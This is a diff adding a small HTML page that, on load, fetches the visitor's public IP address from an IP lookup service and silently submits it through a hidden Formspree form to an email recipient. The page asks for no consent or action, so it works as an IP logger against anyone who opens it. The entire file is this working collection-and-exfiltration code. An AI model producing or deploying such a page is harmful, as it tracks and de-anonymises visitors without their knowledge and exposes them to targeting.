@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send IP via Email</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Sending IP Address...</h1>
+    <form id="contact-form" action="https://formspree.io/f/mrbzqdqw" method="POST">
+        <input type="hidden" id="message" name="message" value="">
+        <input type="hidden" name="_replyto" value="fatcatdevioo@gmail.com"> <!-- Set the reply-to email address -->
+    </form>
+
+    <script>
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return null;
+            }
+        }
+
+        async function sendIP() {
+            const ip = await getIP();
+            if (ip) {
+                document.getElementById('message').value = `IP Address: ${ip}`;
+                document.getElementById('contact-form').submit();
+            }
+        }
+
+        // Automatically trigger the sendIP function when the page loads
+        window.onload = sendIP;
+    </script>
+</body>
+</html>
